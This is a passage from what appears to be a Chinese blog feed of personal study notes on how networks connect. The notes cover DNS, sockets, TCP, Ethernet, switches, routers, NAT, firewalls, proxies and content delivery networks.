class="headerlink" title="互联网的结构"></a>互联网的结构</h2><p>网络之间由NOC(Network Operate Center)连接。</p><p>异构网络之间由IX(Internet Exchange)连接。</p><p>连接互联网需要向ISP(Internet Service Provider)或区域网提交申请。</p><h2 id="远程登录"><a href="#远程登录" class="headerlink" title="远程登录"></a>远程登录</h2><p>为了实现TSS(Time Sharing System)<br>SSH(Secure SHell)协议</p><p>NVT(Network Virtual Terminal)仿真终端.</p><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>分层。</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>含有MX(Mail Exchange)记录,其记录有邮件地址及其作为发送地址时对应的邮件服务器的域名。</p><h2 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h2><p>Uniform Resources Identifier.广义概念<br>URL(Uniform Resources Locator).狭义概念</p><p>URI可用于www以外的协议。</p><h2 id="URI的http方案的具体格式"><a href="#URI的http方案的具体格式" class="headerlink" title="URI的http方案的具体格式"></a>URI的http方案的具体格式</h2><p>http:&#x2F;&#x2F;主机名&#x2F;路径<br>http:&#x2F;&#x2F;主机名:端口号&#x2F;路径<br>http:&#x2F;&#x2F;主机名:端口号&#x2F;路径?访问内容#部分信息。</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>用于保存登录信息或网络购物中放入购物车的商品信息。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>网络是怎样连接的</title>
    <link href="/2022/08/25/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E8%BF%9E%E6%8E%A5%E7%9A%84/"/>
    <url>/2022/08/25/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E8%BF%9E%E6%8E%A5%E7%9A%84/</url>
    
    <content type="html"><![CDATA[<h2 id="协议栈"><a href="#协议栈" class="headerlink" title="协议栈"></a>协议栈</h2><p>网络控制软件。</p><h2 id="网卡"><a href="#网卡" class="headerlink" title="网卡"></a>网卡</h2><p>将包转换为电信号并通过网线发送出去。</p><h2 id="www"><a href="#www" class="headerlink" title="www"></a>www</h2><p>www只是Web服务器上的一种命名。</p><p>World Wide Web不是一个协议的名字，而是Web的提出者最早开发的浏览器兼HTML编辑器的名字</p><h2 id="URL格式"><a href="#URL格式" class="headerlink" title="URL格式"></a>URL格式</h2><p>其用户名，密码，端口号可省略。</p><p><img src="/media/16511291377041.png"></p><p>默认文件。</p><h2 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h2><p>Common Gateway Interface公共网关接口.</p><h2 id="HTTP谓词"><a href="#HTTP谓词" class="headerlink" title="HTTP谓词"></a>HTTP谓词</h2><p>也叫HTTP动词，方法。</p><p>设置网卡是会设置DNS地址，就是DNS服务器的IP地址。</p><p>GET方法能够发送的数据只有几百个字节，如果表单中的数据超过这一长度，则必须使用POST方法来发送。</p><h2 id="请求消息"><a href="#请求消息" class="headerlink" title="请求消息"></a>请求消息</h2><p>格式：</p><ul><li>请求行，可大致了解请求内容</li><li>消息头，附加信息</li><li>消息体，数据</li></ul><p>消息头之后会有一个空行。</p><p>使用GET方法时，消息体中不需要数据。</p><p>使用POST方法时，需要将表单中填写的信息写在消息体中。</p><h2 id="响应消息"><a href="#响应消息" class="headerlink" title="响应消息"></a>响应消息</h2><p>第一行为状态码和响应短语。</p><h2 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h2><p>每个URI标识一个文件。</p><p>每条请求消息中只能写一个URI，所以每次请求只能获取一个文件。</p><h2 id="域名和IP"><a href="#域名和IP" class="headerlink" title="域名和IP"></a>域名和IP</h2><p>直接用IP地址来代替服务器名称也能正常工作，但如果Web服务器使用了虚拟主机功能，就可能无法通过IP地址来访问。</p><p>域名便于记忆。<br>IP地址便于传输。</p><h2 id="操作系统的Socket库"><a href="#操作系统的Socket库" class="headerlink" title="操作系统的Socket库"></a>操作系统的Socket库</h2><p>含DNS解析器。</p><p>库，一堆通用程序组建的集合。</p><p>几个函数：</p><ul><li>socket，创建套接字。</li><li>connect，客户端套接字与服务端连接。三个参数，描述符，服务器IP地址和端口号。</li><li>write，两个参数，描述符和发送数据。</li><li>read，需指定接收缓冲区。</li><li>close，删除套接字。</li></ul><h2 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h2><p>基本工作，接收来自客户端的查询消息，然后根据消息的内容返回响应。</p><p>MX，mail exchange.</p><p>记录类型，A—address，对应IP地址。<br>MX，对应邮件服务器。</p><p>DNS服务器分层。<br>创建子域。</p><p>子域的DNS服务器的IP地址注册到上级DNS 服务器中。</p><p>DNS服务器并不会转发请求，只会直接将下一台DNS服务器的IP告诉我们，然后我们再去发起请求。</p><p>从根服务器开始查询。</p><p>DNS服务器有缓存功能，可以记住之前查询过的域名。<br>缓存信息有一个有效期。</p><h2 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h2><p>socket，传输层连接通信的通信端点。</p><p>服务器一般会在启动后就创建好套接字并等待客户端连接管道。</p><p>断开可以由服务端和客户端任意一方发起。</p><p>断开后，套接字会被删除。</p><p>创建套接字后会返回描述符。</p><p>几个阶段：</p><ul><li>创建套接字</li><li>连接Web服务器</li><li>发送数据</li><li>接收数据</li><li>断开连接，删除套接字</li></ul><p>其实质是一块内存空间，记录了用于控制通信操作的控制信息。</p><p>协议栈是根据套接字中记录的控制信息来工作的。</p><p>套接字的创建：</p><ul><li>分配内存空间</li><li>在控制信息的state列中写入listening</li><li>分配数据包的缓存空间</li></ul><h2 id="连接服务器"><a href="#连接服务器" class="headerlink" title="连接服务器"></a>连接服务器</h2><p>连接实际上是通信双方交换控制信息(用来控制数据收发操作所需的一些信息)，将必要信息记录在套接字并准备数据收发的操作。</p><p>可以看作为“准备”。</p><p>有以下内容：</p><ul><li>把服务器的IP地址和端口号告知协议栈</li><li>客户端向服务器传达开始通信的请求</li></ul><p>过程</p><ul><li>客户端syn</li><li>服务端syn，ack</li><li>客户端ack</li></ul><h2 id="Web和电子邮件的端口号"><a href="#Web和电子邮件的端口号" class="headerlink" title="Web和电子邮件的端口号"></a>Web和电子邮件的端口号</h2><p>Web—-80<br>电子邮件—-25</p><h2 id="HTTP工作流程"><a href="#HTTP工作流程" class="headerlink" title="HTTP工作流程"></a>HTTP工作流程</h2><ul><li>连接</li><li>发送请求消息</li><li>接收响应消息</li><li>断开</li></ul><h2 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h2><p>Resolver，将域名转换为IP地址。</p><h2 id="TCP和UDP"><a href="#TCP和UDP" class="headerlink" title="TCP和UDP"></a>TCP和UDP</h2><p>浏览器、邮件等一般应用程序收发数据时用TCP。</p><p>DNS查询等收发较短的控制数据时用UDP。</p><h2 id="PID"><a href="#PID" class="headerlink" title="PID"></a>PID</h2><p>Process IDentifier，进程标识符。</p><h2 id="通信中的控制信息"><a href="#通信中的控制信息" class="headerlink" title="通信中的控制信息"></a>通信中的控制信息</h2><ul><li><p>头部信息<br>指明传送的对象和发送的信息。</p></li><li><p>套接字中记录的信息</p></li></ul><h2 id="SYN"><a href="#SYN" class="headerlink" title="SYN"></a>SYN</h2><p>Synchronise Sequence Numbers，同步序列编号。</p><p>用于表示连接状态</p><p>ACK用于表示消息的接收状态。<br>ACK序号是一个随机值。<br>ack序号在交互过程中会改变。</p><h2 id="收发数据"><a href="#收发数据" class="headerlink" title="收发数据"></a>收发数据</h2><p>协议栈并不是一收到数据就发送出去，而是会存放在内部的发送缓存区。</p><p>两个判断要素：</p><ul><li>长度，MSS</li><li>时间</li></ul><p>或应用程序指定。</p><p>发送过的包会保存在发送缓冲区中。<br>因此，网卡、集线器、路由器都没有错误补偿机制。</p><h3 id="梳理"><a href="#梳理" class="headerlink" title="梳理"></a>梳理</h3><p>两种情况：</p><ul><li>客户端向服务器发送消息</li><li>服务器向客户端发送消息</li></ul><p>两者可同时进行。<br>以客户端向服务端发送为例：</p><ul><li>应用程序将数据传送给协议栈</li><li>数据进入协议栈内部的发送缓冲区，积累到一定量后发送或等待一段时间后发送</li><li>发送缓冲区的数据被以MSS长度为单位拆分，并计算数据长度放入头部，之后放入单独的网络包，标记上TCP头部，并根据套接字上的信息标记发送方和接收方的端口号。最后将数据包传给IP模块。</li><li>IP模块发送数据包。并将发送过的包包存在发送缓存区中。</li><li>服务器接收数据后计算ACK号并返回</li></ul><p>ACK号和序号初始值相关。<br>TCP会动态设置ACK号的等待时间。</p><h3 id="MTU"><a href="#MTU" class="headerlink" title="MTU"></a>MTU</h3><p>Maximum Transmission Unit，表示一个网络包的最大长度。其是包含头部的长度。</p><h3 id="MSS"><a href="#MSS" class="headerlink" title="MSS"></a>MSS</h3><p>Maximum Segment Size，最大分段大小。去除头部的大小。</p><p>数据会以MSS的大小拆分。</p><h3 id="SFD"><a href="#SFD" class="headerlink" title="SFD"></a>SFD</h3><p>Start Frame Delimiter，起始帧分界符。</p><h3 id="FCS"><a href="#FCS" class="headerlink" title="FCS"></a>FCS</h3><p>Frame Check Sequence，帧校验序列</p><h2 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h2><p>为了防止接收缓冲区溢出。</p><p>窗口大小代表了缓冲区大小。</p><p>窗口的大小是动态变化的。更新时机，当接收方将数据传递给应用程序时(此时接收缓冲区会变大)。</p><p>ACK号可合并，比如要返回两个ACK号，201～400和401～600，此时可合并为一个201～600。</p><p>在返回ACK号时若更新了窗口大小，则可将这两个信息一起返回。</p><h2 id="IP包的收发"><a href="#IP包的收发" class="headerlink" title="IP包的收发"></a>IP包的收发</h2><p>发送方和接收方统称为终端节点，转发设备被称为转发节点或者中间节点。</p><p>TCP模块将包传递给IP模块时，需指定通信对象的IP地址。</p><p>IP模块添加两个头部：</p><ul><li>MAC头部，包含MAC地址，用于将包传输至最近的路由器的控制信息。</li><li>IP头部，将包发往目的地的控制信息。</li></ul><p>IP地址的最初来源是应用程序，应用程序交给TCP模块，TCP模块传递给IP模块。</p><p>IP地址实际上是分配给网卡的。</p><p>协议号。</p><p>MAC头中写的MAC地址在传输过程中会改变。</p><p>以太类型就是使用的协议类型。</p><h3 id="ARP表"><a href="#ARP表" class="headerlink" title="ARP表"></a>ARP表</h3><p>查询目标路由器的MAC地址。</p><p>可能发生的通讯异常，当IP地址改变时，ARP缓存表中的值并未改变。</p><h3 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h3><p>一种以多台计算机能彼此自由和廉价地通信而设计的通信技术。</p><p>最开始，以太网中一个设备发送信号，其他设备都会接收到。</p><p>三个未改变的基本性质：</p><ul><li>包发送到MAC头部中的接收方的MAC地址，即目的地。</li><li>用MAC头部中的发送方的MAC地址识别发送方。</li><li>用以太类型识别包的内容。</li></ul><p>以太类型就是协议类型。</p><h2 id="网卡-1"><a href="#网卡-1" class="headerlink" title="网卡"></a>网卡</h2><p>结构：</p><p><img src="/media/16516425247159.png"></p><p>硬件设备都有驱动程序。</p><p>网卡驱动程序也是厂商开发的专用程序。</p><p>硬件在工作前要初始化。</p><p>网卡的ROM中保存着唯一的MAC地址。在生产时写入。</p><p>网卡驱动进行初始化时在MAC模块中设置MAC地址。</p><h3 id="报头和报尾"><a href="#报头和报尾" class="headerlink" title="报头和报尾"></a>报头和报尾</h3><p>MAC模块会在包开头加上报头和起始帧分界符(长56比特)，最后两位为11.</p><p>在末尾加上用于检测错误的帧校验序列(长32比特)。</p><h3 id="时钟信号的作用"><a href="#时钟信号的作用" class="headerlink" title="时钟信号的作用"></a>时钟信号的作用</h3><p>时钟信号，用于判断出比特之间的界限。哪一截是一比特，由时钟信号判断。</p><p>可以决定是在上升沿或下降沿读取电压和电流信号。</p><p>解决时钟偏移的问题，发送的信号为数据信号和时钟信号的叠加。</p><h3 id="报头的作用"><a href="#报头的作用" class="headerlink" title="报头的作用"></a>报头的作用</h3><p>用于测量时钟信号。</p><h2 id="发送方式"><a href="#发送方式" class="headerlink" title="发送方式"></a>发送方式</h2><ul><li>集线器的半双工模式，即同一时刻只能进行发送和接收中的一种。</li><li>全双工模式，同一时刻发送和接收能同时进行。</li></ul><h3 id="网络的传输速率"><a href="#网络的传输速率" class="headerlink" title="网络的传输速率"></a>网络的传输速率</h3><p>即数字信息转换为电信号的速率。</p><h3 id="MAU模块"><a href="#MAU模块" class="headerlink" title="MAU模块"></a>MAU模块</h3><p>将MAC模块生成的通用信号转换成可在网线中传输的格式，并通过网线发送出去。</p><p>还具监听作用。</p><p>信号碰撞。</p><h3 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h3><p>一种电信号，由硬件产生，并直接送到中断控制器上，然后再由中断控制器向CPU发送信号，CPU检测到信号后，就会中断当前的工作转而去处理中断。</p><p>就是让CPU停下(挂起)当前的程序，而运行中断处理的程序。</p><p>在这里，形象的说中断就是“敲门”这个动作。</p><h3 id="主要的ICMP消息"><a href="#主要的ICMP消息" class="headerlink" title="主要的ICMP消息"></a>主要的ICMP消息</h3><p><img src="/media/16516477115302.png"></p><h2 id="接收服务器响应"><a href="#接收服务器响应" class="headerlink" title="接收服务器响应"></a>接收服务器响应</h2><p>分片重组。</p><p>套接字工作。</p><h2 id="UDP协议的收发操作"><a href="#UDP协议的收发操作" class="headerlink" title="UDP协议的收发操作"></a>UDP协议的收发操作</h2><p>向DNS服务器查询IP的时候使用的是UDP协议。</p><p>音频和视频数据使用UDP发送</p><h2 id="信号在网线和集线器中传输"><a href="#信号在网线和集线器中传输" class="headerlink" title="信号在网线和集线器中传输"></a>信号在网线和集线器中传输</h2><p>现在的家用路由器已集成了集线器和交换机的功能。</p><p>电信号的频率越高，能量的损失率越大。</p><h3 id="双绞线"><a href="#双绞线" class="headerlink" title="双绞线"></a>双绞线</h3><p>双绞线，抑制噪声。</p><p>分正负两条网线。</p><p>电磁波接触金属等导体，会在其中产生电流，因此，若网线周围有电磁波，就会产生和原本的信号不同的电流。</p><p>噪声分内源性噪声和外源性噪声。</p><h3 id="集线器"><a href="#集线器" class="headerlink" title="集线器"></a>集线器</h3><p>将信号广播。</p><h4 id="MDI-x2F-MDI-X切换开关"><a href="#MDI-x2F-MDI-X切换开关" class="headerlink" title="MDI&#x2F;MDI-X切换开关"></a>MDI&#x2F;MDI-X切换开关</h4><p>Media Dependent Interface，媒体相关接口，直连接线，用于集线器之间连接。</p><p>Media Dependent Interface- Crossover。交叉接线，用于集线器和设备之间连接。</p><p>直连接线就是“发送线路”连“发送线路”，“接收线路”连“接收线路”。</p><p>交叉接线是“发送线路”接“接收线路”，反之亦然。</p><h3 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h3><p>几乎都有的结构，内存、MAC模块和PHY模块。</p><p>几乎都有的操作，将输入的电信号转换为数字信号，然后将数字信号转换为电信号发送出去。</p><p>交换机端口的MAC模块不具有MAC地址。</p><p>交换机中登记的MAC地址和端口对应。</p><h4 id="交换电路"><a href="#交换电路" class="headerlink" title="交换电路"></a>交换电路</h4><p>交换机由交换电路而来。</p><p>交换电路交叉点处的交换开关为电子开关。</p><p>其地址表会自行更新或删除。</p><p>若没有接收方的端口，则广播到所有的端口。</p><p>接收设备接收到包后会返回响应，这样交换机就可以记录。</p><h4 id="全双工模式"><a href="#全双工模式" class="headerlink" title="全双工模式"></a>全双工模式</h4><p>交换机特有。</p><p>不使用集线器，就可以避免信号碰撞。</p><p>工作模式。</p><h4 id="连接脉冲"><a href="#连接脉冲" class="headerlink" title="连接脉冲"></a>连接脉冲</h4><p>在以太网中没有数据传输时，填充的脉冲信号。</p><p>检测对方网线是否正确连接。</p><p>通过特殊的脉冲序列。<br>也可以用于交换连接双方的状态信息，如支持的工作模式和传输速率。</p><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p>交换机是基于以太网设置的，路由器是基于IP设计的。</p><p>路由器的各个端口都具有MAC地址和IP地址。</p><h4 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a>路由表</h4><p>路由表匹配时，只匹配网络号部分。</p><p><img src="/media/16517249101641.png"></p><h5 id="路由聚合"><a href="#路由聚合" class="headerlink" title="路由聚合"></a>路由聚合</h5><p>将路由表中多个子网合并为一个子网。</p><h5 id="子网掩码列"><a href="#子网掩码列" class="headerlink" title="子网掩码列"></a>子网掩码列</h5><p>表示匹配时需要对比的比特数量。</p><h5 id="跃点计数"><a href="#跃点计数" class="headerlink" title="跃点计数"></a>跃点计数</h5><p>表示距离目标IP地址的远近。</p><h5 id="路由表维护"><a href="#路由表维护" class="headerlink" title="路由表维护"></a>路由表维护</h5><ul><li>手动维护</li><li>路由器之间信息交换</li></ul><h4 id="路由器接收包"><a href="#路由器接收包" class="headerlink" title="路由器接收包"></a>路由器接收包</h4><p>路由器的一个接口相当于一个网卡。</p><p>选择，子网掩码长，跃点少。</p><p>接收之后MAC头部会被丢弃。</p><h5 id="默认路由"><a href="#默认路由" class="headerlink" title="默认路由"></a>默认路由</h5><p>子网掩码为0.0.0.0，为互联网接入路由器，当路由表中没有匹配到时转发到这里，这里配置的网关地址也叫默认网关。</p><h5 id="更新TTL"><a href="#更新TTL" class="headerlink" title="更新TTL"></a>更新TTL</h5><p>每经过一个路由器转发，TTL(Time To Live)的值就会减一，为零时被丢弃。</p><h5 id="分片处理"><a href="#分片处理" class="headerlink" title="分片处理"></a>分片处理</h5><p>TCP的拆分，将数据分为包，IP的分片，将包再拆分，此时考虑MTU。</p><p>两种情况不分片：</p><ul><li>应用程序设置不允许分片</li><li>包已经被分片</li></ul><h4 id="路由器发送包"><a href="#路由器发送包" class="headerlink" title="路由器发送包"></a>路由器发送包</h4><p>规则取决于端口的类型。</p><p>重新添加MAC头部。</p><p>ARP，通过IP查MAC。</p><h4 id="路由器与交换机之间的关系"><a href="#路由器与交换机之间的关系" class="headerlink" title="路由器与交换机之间的关系"></a>路由器与交换机之间的关系</h4><p>就是IP与以太网之间的关系路由器将包的传输工作交给交换机进行。</p><h4 id="IP不负责包的传送"><a href="#IP不负责包的传送" class="headerlink" title="IP不负责包的传送"></a>IP不负责包的传送</h4><p>只是委托各种通信技术将包传输到下一个路由器。</p><h4 id="路由器的附加功能"><a href="#路由器的附加功能" class="headerlink" title="路由器的附加功能"></a>路由器的附加功能</h4><p>主要是两个：</p><ul><li>地址过滤</li><li>包过滤</li></ul><h5 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h5><p>内网和外网。</p><p>内网的设立，解决地址不足的问题。</p><p>内网与内网之间是相互独立的,但不是完全独立。</p><p>内网的网络包只在内网之间流动。</p><p>作用于内网的地址叫私有地址(Globally Unique Address),原来的固定地址叫共有地址(Public Address)</p><p>私有地址范围：</p><ul><li>10.0.0.0~10.255.255.255</li><li>172.16.0.0~172.31.255.255</li><li>192.168.0.0~192.168.255.255</li></ul><p>内网分两部分：</p><ul><li>对互联网开放的服务器。分配公有地址，可以和互联网直接通信。</li><li>公司内部设备。分配私有地址，不能和互联网直接收发网络包。</li></ul><p>地址转换机制，基本原理，在转发网络包时修改IP头部中的IP地址和端口号。</p><p>家庭网络中的过程也相同。</p><p>改写端口号，从空闲的端口中随机选择。</p><p>除非公司允许，无法从互联网向公司内网发送网络包，(对应表中无记录)具备防止非法入侵的效果。</p><p>可以将服务器的私有地址手动配置在地址转换设备中，就可以从互联网访问这个服务器了。</p><h5 id="包过滤"><a href="#包过滤" class="headerlink" title="包过滤"></a>包过滤</h5><p>路由器在对包进行转换时，根据MAC地址、IP地址、TCP头部的内容，按照事先设置好的规则决定是转发还是丢弃这个包。</p><p>防火墙设备或软件，大多利用这一机制。</p><h4 id="hub解析"><a href="#hub解析" class="headerlink" title="hub解析"></a>hub解析</h4><p>hub，轴。</p><p>现实可想象为，自行车轮，辐条从车轮边缘一直汇聚到轴处。</p><p>网络可想象为，网线聚集的地方。</p><p>小型廉价的普及型产品一般叫交换机，大型的高性能产品一般叫二层交换机。</p><h2 id="光纤接入网"><a href="#光纤接入网" class="headerlink" title="光纤接入网"></a>光纤接入网</h2><p>FTTH，Fiber To The Home，</p><h2 id="ADSL"><a href="#ADSL" class="headerlink" title="ADSL"></a>ADSL</h2><p>Asymmetric Digital Subscriber Line,不对称数字用户线，一种利用架设在电线杆上的金属电话线来进行高速通信的技术。</p><p>它的上行方向(用户到互联网)和下行方向(互联网到用户)的通信速率是不对称的。</p><p>双绞线的极限距离是100米，光纤可达几公里。</p><hr><p>互联网中网络间的距离和路由的维护方式和家庭、公司不同。</p><h2 id="Modem"><a href="#Modem" class="headerlink" title="Modem"></a>Modem</h2><p>调制解调器。</p><p>Modulator(调制器)和Demodulator(解调器)的简称。</p><p>调制，modulate，即把数字信号转换成电话线上传输的模拟信号。</p><p>解调，demodulate，把模拟信号转换成数字信号。</p><h2 id="BAS"><a href="#BAS" class="headerlink" title="BAS"></a>BAS</h2><p>Broadband Access Server.宽带接入服务器，是一种路由器。</p><h2 id="PPP"><a href="#PPP" class="headerlink" title="PPP"></a>PPP</h2><p>Point-to-Point Protocol,点到点协议。</p><p>三个头部，MAC头部、PPPoE头部、PPP头部。</p><h2 id="ADSL-Modem-对包的拆分"><a href="#ADSL-Modem-对包的拆分" class="headerlink" title="ADSL Modem 对包的拆分"></a>ADSL Modem 对包的拆分</h2><p>拆分为很多小格子，称信元。</p><p>信元是小数据块，包含5字节头部和48字节数据，用于ATM(Asynchronous Transfer Mode)异步传输</p><h3 id="ADSL-Modem对信号的调制"><a href="#ADSL-Modem对信号的调制" class="headerlink" title="ADSL Modem对信号的调制"></a>ADSL Modem对信号的调制</h3><p>不用方波的原因：</p><ul><li>波形易失真</li><li>难以控制噪声</li></ul><p>调制为正弦波。<br>振幅调制ASK，相位调制PSK组成正交振幅调制QAM。</p><p><img src="/media/16517943441373.png"></p><p>其将信元转换为电信号。</p><p>分离器，将电话信号和ADSL信号分离。</p><p>IDF(Intermediate Distribution Frame)中间配线盘，MDF(Main Distribution Frame)主配线盘。</p><p>保安器，防止雷电等情况下电话线中产生过大电流的一种保护装置，内部有保险丝。</p><h3 id="信号线"><a href="#信号线" class="headerlink" title="信号线"></a>信号线</h3><p>直径不同，信号衰减率等待性不同。</p><p>线越细衰减率越高。<br><img src="/media/16517952103552.png"></p><p>电缆隧道，地下电缆。</p><h3 id="ISDN"><a href="#ISDN" class="headerlink" title="ISDN"></a>ISDN</h3><p>Integrated Services Digital Network，综合业务数字网。</p><h3 id="DSLAM"><a href="#DSLAM" class="headerlink" title="DSLAM"></a>DSLAM</h3><h3 id="POP和NOC"><a href="#POP和NOC" class="headerlink" title="POP和NOC"></a>POP和NOC</h3><p>都位于一个运营商中。</p><p>POP，Point Of Presense, 接入点。其本质是各种类型的路由器，取决于接入类型，还有交换机。</p><p>POP处的路由器需大量端口，其速率低于核心网络。</p><p>NOC，Network Operation Center, 网络运行中心，集中POP传来的包，可从这里转发至离目的地更近的POP或转发至其他运营商。 </p><p>NOC和PO没有严格的界定。可以认为NOC是规模扩大的POP。</p><h3 id="光纤铺设"><a href="#光纤铺设" class="headerlink" title="光纤铺设"></a>光纤铺设</h3><p>地下。</p><p>光纤可以复用。<br><img src="/media/16521403771184.png"></p><h3 id="运营商之间的路由交换"><a href="#运营商之间的路由交换" class="headerlink" title="运营商之间的路由交换"></a>运营商之间的路由交换</h3><p>相连的路由器告知路由信息。</p><p>转接，对等。</p><p>公司内部可采用最短路由。</p><p>运营商之间的路由交换需进行筛选。</p><h3 id="BGP协议"><a href="#BGP协议" class="headerlink" title="BGP协议"></a>BGP协议</h3><p>Border Gateway Protocol.</p><h3 id="IX"><a href="#IX" class="headerlink" title="IX"></a>IX</h3><p>Internet eXchange,互联网交换中心。运营商线路的中心，相当于是集运营商之间一对一连接的线。</p><p>IX的核心是具有大量高速的以太网端口的二层交换机(基本原理和一层交换机相同)。</p><h3 id="服务器和路由器"><a href="#服务器和路由器" class="headerlink" title="服务器和路由器"></a>服务器和路由器</h3><p>计算机都能完成路由器的工作，只要有相应的软件，一般路由器上安装的就是Linux操作系统。</p><h1 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h1><h2 id="防火墙原理"><a href="#防火墙原理" class="headerlink" title="防火墙原理"></a>防火墙原理</h2><p>firewall。</p><p>根据MAC地址，IP头部，TCP头部的内容，来决定是转发还是丢弃。</p><p>只允许指定应用程序的网络包发送。</p><h3 id="包过滤-1"><a href="#包过滤-1" class="headerlink" title="包过滤"></a>包过滤</h3><p>通过接收方IP地址、发送方IP地址、接收方端口号、发送方端口号、TCP控制位这些条件，判断出通信的起点和终点、应用程序种类。</p><h4 id="TCP连接时的三个包的控制位"><a href="#TCP连接时的三个包的控制位" class="headerlink" title="TCP连接时的三个包的控制位"></a>TCP连接时的三个包的控制位</h4><p>第一个包，SYN为1，ACK为0.</p><p>用于阻止Web服务器为起点访问互联网。</p><h4 id="无法阻止对DNS服务器的访问"><a href="#无法阻止对DNS服务器的访问" class="headerlink" title="无法阻止对DNS服务器的访问"></a>无法阻止对DNS服务器的访问</h4><p>使用UDP协议的都会有这样的问题。</p><p>只能二选一，要么允许该应用程序的所有包通过，要么阻止。</p><h4 id="通过防火墙"><a href="#通过防火墙" class="headerlink" title="通过防火墙"></a>通过防火墙</h4><p>被阻止的包会被丢弃并记录下来。</p><p>若允许通过，则转发。</p><h4 id="防火墙无法抵御的攻击"><a href="#防火墙无法抵御的攻击" class="headerlink" title="防火墙无法抵御的攻击"></a>防火墙无法抵御的攻击</h4><p>需要检查内容的攻击。</p><p>防火墙无法检查包的内容。</p><p>方法，部署用来检查内容的设备或软件。</p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>多台服务器分担负载，这种架构称分布式架构。</p><h4 id="轮询分配"><a href="#轮询分配" class="headerlink" title="轮询分配"></a>轮询分配</h4><p>通过轮询(round-robin)的方式将访问平均分配给所有服务器</p><p>通过DNS服务器来实现。</p><p>通过DNS服务器查询服务器名称时，其返回多个IP地址。</p><h4 id="负载均衡器"><a href="#负载均衡器" class="headerlink" title="负载均衡器"></a>负载均衡器</h4><p>负载均衡的作用是分流，而难点在于判断什么时候不分流。</p><h4 id="判断请求相关性的信息"><a href="#判断请求相关性的信息" class="headerlink" title="判断请求相关性的信息"></a>判断请求相关性的信息</h4><p>在表单中加入表示关联的信息或在HTTP头部字段中加上用来判断相关性的信息(cookie).</p><h4 id="使用缓存服务器分担负载"><a href="#使用缓存服务器分担负载" class="headerlink" title="使用缓存服务器分担负载"></a>使用缓存服务器分担负载</h4><p>将整个系统按功能分成不同的服务器。</p><p>用户向缓存服务器发出请求，缓存服务器将请求保存在缓存中。</p><p>Via字段。</p><p>返回响应时可根据请求消息中URL的目录名判断。</p><p>数据积累。</p><p>如果请求内容在缓存中存在，返回If-Moified—Since头部字段，其中加上上次保存的时间，询问Web服务器在这个时间之后数据有没有发生变化。</p><h4 id="代理的基本原理"><a href="#代理的基本原理" class="headerlink" title="代理的基本原理"></a>代理的基本原理</h4><p>在客户端和Web服务器之间充当中间人的方式就是代理的基本原理。</p><h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><p>forward proxy。<br>在客户端一侧部署缓存服务器。</p><p>可用来实现防火墙。代理可以查看请求的内容。</p><p>访问过的数据会被缓存。</p><p>在客户端设置了代理，会在URI部分填写完整的网址。</p><p>使用正向代理需要在浏览器中设置。</p><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>reverse proxy。<br>类似于服务器端的缓存服务器。<br>正向代理的改良版。</p><h4 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h4><p>transparent proxy。<br>位于请求消息从浏览器传输到Web服务器的路径中，当消息经过时进行拦截。</p><p>客户端处的缓存服务器：</p><ul><li>降低流量消耗</li><li>避免拥堵点</li></ul><h3 id="内容分发服务"><a href="#内容分发服务" class="headerlink" title="内容分发服务"></a>内容分发服务</h3><p>CDS，Content Delivery Service。或CDN，Content Delivery Network or Content Distribution Network。</p><p>提供这种服务的厂商叫CDSN，Content Delivery Service Provider。</p><p>该服务时将Web服务器可以控制的缓存服务器放在客户端的运营商处。</p><h4 id="让客户端找到最近的缓存服务器"><a href="#让客户端找到最近的缓存服务器" class="headerlink" title="让客户端找到最近的缓存服务器"></a>让客户端找到最近的缓存服务器</h4><hr><p>现在的局域网用光纤连接，范围可以很大且速度快。</p><h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><p>路由器和交换机不考虑请求包和响应包之间的关联。</p><p>一台服务器上可以运行多个服务器程序。</p><h3 id="服务器程序的结构"><a href="#服务器程序的结构" class="headerlink" title="服务器程序的结构"></a>服务器程序的结构</h3><p>每有一个客户端连接进来，就启动一个新的服务器程序，确保服务器程序和客户端是一对一的状态。</p><p>服务器程序启动时，读配置文件完成初始化。</p><p>程序分为两个模块：</p><ul><li>等待连接模块</li><li>负责与客户端通信的模块</li></ul><p>多任务，也可称为多进程，并发，就是一个处理器在多个程序之间快速切换。</p><h3 id="客户端和服务器的区别"><a href="#客户端和服务器的区别" class="headerlink" title="客户端和服务器的区别"></a>客户端和服务器的区别</h3><p>硬件部分有所不同，网络相关部分如网卡、协议栈等的功能是一样的，但用法上有差异。</p><hr><p>连接无法单方面连接，需要有一方等待连接，另一方才能发起连接。</p><p>客户端发起连接时，要指定服务器端的端口号。</p><h3 id="通信操作"><a href="#通信操作" class="headerlink" title="通信操作"></a>通信操作</h3><h4 id="套接字-1"><a href="#套接字-1" class="headerlink" 